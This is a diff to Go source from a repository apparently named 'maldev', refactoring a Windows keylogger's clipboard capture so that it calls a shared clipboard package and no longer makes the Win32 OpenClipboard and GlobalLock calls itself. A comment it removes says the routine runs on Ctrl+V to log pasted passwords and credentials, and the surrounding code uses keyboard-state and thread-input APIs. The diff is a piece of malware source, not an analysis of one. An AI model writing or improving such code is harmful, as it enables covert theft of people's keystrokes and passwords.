@@ -11,6 +11,7 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/collection/clipboard"
 	"github.com/oioio-space/maldev/win/api"
 )
 
@@ -94,11 +95,6 @@ var (
 	procPostThreadMessageW       = api.User32.NewProc("PostThreadMessageW")
 	procGetAsyncKeyState         = api.User32.NewProc("GetAsyncKeyState")
 	procAttachThreadInput        = api.User32.NewProc("AttachThreadInput")
-	procOpenClipboard            = api.User32.NewProc("OpenClipboard")
-	procCloseClipboard           = api.User32.NewProc("CloseClipboard")
-	procGetClipboardData         = api.User32.NewProc("GetClipboardData")
-	procGlobalLock               = api.Kernel32.NewProc("GlobalLock")
-	procGlobalUnlock             = api.Kernel32.NewProc("GlobalUnlock")
 )
 
 // hookState holds per-session state shared between the message loop
@@ -433,27 +429,11 @@ func translateKey(vkCode, scanCode, flags uint32, hwnd uintptr) string {
 }
 
 // readClipboardText captures the current clipboard text content.
-// Called on Ctrl+V to log pasted passwords and credentials.
+// Delegates to collection/clipboard to avoid duplicating the
+// OpenClipboard+GetClipboardData+GlobalLock sequence.
 func readClipboardText() string {
-	const cfUnicodeText = 13
-	r, _, _ := procOpenClipboard.Call(0)
-	if r == 0 {
-		return ""
-	}
-	defer procCloseClipboard.Call() //nolint:errcheck
-
-	h, _, _ := procGetClipboardData.Call(cfUnicodeText)
-	if h == 0 {
-		return ""
-	}
-
-	ptr, _, _ := procGlobalLock.Call(h)
-	if ptr == 0 {
-		return ""
-	}
-	defer procGlobalUnlock.Call(h) //nolint:errcheck
-
-	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
+	text, _ := clipboard.ReadText()
+	return text
 }
 
 // resolveWindow returns the title and process path of a window handle.
